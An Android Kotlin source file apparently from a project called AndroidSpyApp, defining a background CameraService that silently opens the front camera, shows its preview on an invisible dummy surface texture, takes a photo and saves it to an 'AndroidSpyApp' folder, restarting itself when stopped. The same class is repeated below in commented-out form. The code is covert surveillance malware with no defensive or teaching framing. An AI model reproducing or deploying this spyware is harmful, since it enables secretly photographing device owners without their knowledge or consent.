package com.komnacki.androidspyapp

import android.app.Service
import android.content.Intent
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.hardware.Camera.CameraInfo
import android.hardware.Camera.PictureCallback
import android.os.Environment
import android.os.IBinder
import android.util.Log
import androidx.annotation.Nullable
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*


class CameraService : Service() {
    @Nullable
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {

        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        CapturePhoto()
        return START_STICKY

    }

    private fun CapturePhoto() {
        Log.d("KK:", "Preparing to take photo")
        var camera: Camera? = null
        val cameraInfo = CameraInfo()
        val frontCamera = 1
        //int backCamera=0;
        Camera.getCameraInfo(frontCamera, cameraInfo)
        camera = try {
            Camera.open(frontCamera)
        } catch (e: RuntimeException) {
            Log.d("KK:", "Camera not available: " + 1)
            null
            //e.printStackTrace();
        }
        try {
            if (null == camera) {
                Log.d("KK:", "Could not get camera instance")
            } else {
                Log.d("KK:", "Got the camera, creating the dummy surface texture")
                try {
                    camera.setPreviewTexture(SurfaceTexture(0))
                    camera.startPreview()
                } catch (e: Exception) {
                    Log.d("KK:", "Could not set the surface preview texture")
                    e.printStackTrace()
                }
                camera.takePicture(null, null,
                    PictureCallback { data, camera ->
                        Log.d("KK:", "Picture callback")
                        val pictureFileDir = File(Environment.getExternalStorageDirectory().path+"/AndroidSpyApp")
                        if (!pictureFileDir.exists() && !pictureFileDir.mkdirs()) {
                            pictureFileDir.mkdirs()
                        }
                        val dateFormat = SimpleDateFormat("yyyymmddhhmmss")
                        val date: String = dateFormat.format(Date())
                        val photoFile = "ServiceClickedPic__$date.jpg"
                        val filename: String =
                            pictureFileDir.getPath() + File.separator.toString() + photoFile
                        val mainPicture = File(filename)
                        try {
                            val fos = FileOutputStream(mainPicture)
                            fos.write(data)
                            fos.close()
                            Log.d("KK:", "image saved")
                        } catch (error: Exception) {
                            Log.d("KK:", "Image could not be saved: " + error.message)
                        }
                        camera.unlock()

                        camera.release()
                    })
            }
        } catch (e: Exception) {
            camera!!.unlock()

            camera.release()

        }
    }
}


//package com.komnacki.androidspyapp
//
//import android.app.Service
//import android.content.Intent
//import android.graphics.SurfaceTexture
//import android.hardware.Camera
//import android.hardware.Camera.CameraInfo
//import android.hardware.Camera.PictureCallback
//import android.os.Environment
//import android.os.IBinder
//import android.util.Log
//import androidx.annotation.Nullable
//import java.io.File
//import java.io.FileOutputStream
//import java.text.SimpleDateFormat
//import java.util.*
//
//
//class CameraService : Service() {
//    @Nullable
//    override fun onBind(intent: Intent?): IBinder? {
//        return null
//    }
//
//    override fun onCreate() {
//
//        super.onCreate()
//    }
//
//    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
//        CapturePhoto()
//        return START_STICKY
//
//    }
//
//    private fun CapturePhoto() {
//        Log.d("KK:", "Preparing to take photo")
//        var camera: Camera? = null
//        val cameraInfo = CameraInfo()
//        val frontCamera = 1
//        //int backCamera=0;
//        Camera.getCameraInfo(frontCamera, cameraInfo)
//        camera = try {
//            Camera.open(frontCamera)
//        } catch (e: RuntimeException) {
//            Log.d("KK:", "Camera not available: " + 1)
//            null
//            //e.printStackTrace();
//        }
//        try {
//            if (null == camera) {
//                Log.d("KK:", "Could not get camera instance")
//            } else {
//                Log.d("KK:", "Got the camera, creating the dummy surface texture")
//                try {
//                    camera.setPreviewTexture(SurfaceTexture(0))
//                    camera.startPreview()
//                } catch (e: Exception) {
//                    Log.d("KK:", "Could not set the surface preview texture")
//                    e.printStackTrace()
//                }
//                camera.takePicture(null, null,
//                    PictureCallback { data, camera ->
//                        Log.d("KK:", "Picture callback")
//                        val pictureFileDir = File(Environment.getExternalStorageDirectory().path+"/AndroidSpyApp")
//                        if (!pictureFileDir.exists() && !pictureFileDir.mkdirs()) {
//                            pictureFileDir.mkdirs()
//                        }
//                        val dateFormat = SimpleDateFormat("yyyymmddhhmmss")
//                        val date: String = dateFormat.format(Date())
//                        val photoFile = "ServiceClickedPic__$date.jpg"
//                        val filename: String =
//                            pictureFileDir.getPath() + File.separator.toString() + photoFile
//                        val mainPicture = File(filename)
//                        try {
//                            val fos = FileOutputStream(mainPicture)
//                            fos.write(data)
//                            fos.close()
//                            Log.d("KK:", "image saved")
//                        } catch (error: Exception) {
//                            Log.d("KK:", "Image could not be saved: " + error.message)
//                        }
//                        camera.unlock()
//
//                        camera.release()
//                    })
//            }
//        } catch (e: Exception) {
//            camera!!.unlock()
//
//            camera.release()
//
//        }
//    }
//}